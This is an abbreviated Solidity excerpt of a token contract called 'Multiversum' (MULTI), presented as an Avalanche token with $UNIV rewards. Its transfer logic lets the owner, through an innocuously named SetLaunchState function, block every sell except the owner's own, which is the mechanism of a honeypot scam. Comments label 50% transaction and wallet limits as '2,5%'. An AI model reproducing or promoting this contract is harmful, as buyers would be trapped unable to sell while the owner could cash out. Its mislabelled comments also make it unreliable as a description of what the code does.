...
*
Multiversum
Avalanche C-Chain Token
With $UNIV Rewards
   _____   ____ ___.____  ___________._______   _________________________  _____________ ___  _____
  /     \ |    |   \    | \__    ___/|   \   \ /   /\_   _____/\______   \/   _____/    |   \/     \
 /  \ /  \|    |   /    |   |    |   |   |\   Y   /  |    __)_  |       _/\_____  \|    |   /  \ /  \
/    Y    \    |  /|    |___|    |   |   | \     /   |        \ |    |   \/        \    |  /    Y    \
\____|__  /______/ |_______ \____|   |___|  \___/   /_______  / |____|_  /_______  /______/\____|__  /
         \/                 \/                               \/         \/        \/                \/
*
*
*
...
contract Multiversum is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Multiversum";
    string constant _symbol = "MULTI";
    uint8 constant _decimals = 6;

    uint256 _totalSupply = 1_000_000_000_000_000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply.div(2); // 2,5%
    uint256 public _maxWallet = _totalSupply.div(2); // 2,5%
    ...
    address public autoLiquidityReceiver=0xFa2C6B54C0D34C2B5537956EAA87F1a1E371fBB6;
    address public marketingFeeReceiver=0xFa2C6B54C0D34C2B5537956EAA87F1a1E371fBB6;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!feeDivider || sender==owner), "Fee Divider failed");
    ...
    function SetLaunchState(bool divider) external onlyOwner {
        feeDivider = divider;
    }
